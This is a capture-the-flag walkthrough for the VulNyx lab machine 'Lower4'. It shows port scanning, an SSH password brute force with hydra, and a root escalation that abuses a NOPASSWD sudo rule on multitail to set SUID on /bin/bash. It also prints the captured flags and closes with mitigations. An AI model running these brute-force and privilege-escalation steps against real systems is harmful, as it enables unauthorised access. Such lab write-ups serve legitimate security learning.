# VulNyx Machine Walkthrough: **Lower4**

---

## 1. Reconnaissance

### Nmap Scan

```bash
sudo nmap -sS -p- -T4 192.168.1.187
sudo nmap -sVC --min-rate 6000 -p22,80,113 -vvv -Pn 192.168.1.187
```

**Results:**

* **22/tcp** – SSH (OpenSSH 2.0a Debian)
* **80/tcp** – HTTP (Apache 2.4.58 Debian)
* **113/tcp** – IDENT

### Service Enumeration

* **SSH**: OpenSSH 2.0a (Debian patched)
* **HTTP**: Apache 2.4.58 with default Debian page
* **IDENT**: Auth service running

---

## 2. Initial Access

### SSH Brute Force Attack

Used **Hydra** to brute force SSH credentials:

```bash
hydra -l lucifer -P /usr/share/wordlists/rockyou.txt 192.168.1.187 ssh
```

**Credentials Found:**

* **Username**: lucifer
* **Password**: *(from rockyou.txt)*

### SSH Connection

```bash
ssh lucifer@192.168.1.187
```

Successfully connected and obtained a user shell.

---

## 3. User Flag

```bash
lucifer@lower4:~$ ls
user.txt

lucifer@lower4:~$ cat user.txt
8e99e9f5a7d2d7a067314e34d9fd957F
```

**User Flag:**

```
8e99e9f5a7d2d7a067314e34d9fd957F
```

---

## 4. Privilege Escalation

### Sudo Privilege Check

```bash
lucifer@lower4:~$ sudo -l
User lucifer may run the following commands on lower4:
    (root) NOPASSWD: /usr/bin/multitail
```

### Exploiting Multitail

`multitail` can be executed as **root without a password**. This allows command execution as root.

```bash
sudo -u root /usr/bin/multitail -1 "chmod 4755 /bin/bash"
```

### Obtaining Root Shell

```bash
lucifer@lower4:~$ /bin/bash -p
bash-5.1# whoami
root
```

---

## 5. Root Flag

```bash
bash-5.1# cd /root
bash-5.1# ls
root.txt

bash-5.1# cat root.txt
c07db370f9e16dcde97d554b38c9c08e
```

**Root Flag:**

```
c07db370f9e16dcde97d554b38c9c08e
```

---

## Summary

| Step                 | Technique            | Tool / Command        |
| -------------------- | -------------------- | --------------------- |
| Recon                | Port Scanning        | `nmap -sS -p-`        |
| Initial Access       | SSH Brute Force      | `hydra` + rockyou.txt |
| Enumeration          | Sudo Privilege Check | `sudo -l`             |
| Privilege Escalation | SUID Abuse           | `multitail`           |
| Post-Exploitation    | Flag Collection      | Manual                |

---

## Vulnerabilities

1. Weak SSH password (brute-forceable)
2. Sudo misconfiguration (`multitail` with `NOPASSWD`)
3. Privilege escalation via SUID bash

---

## Mitigations

* Enforce strong password policies
* Disable SSH password authentication or use fail2ban
* Review `sudoers` configuration regularly
* Avoid `NOPASSWD` for dangerous binaries
* Keep the system updated

---

**Author:** Walkthrough for educational & lab purposes only
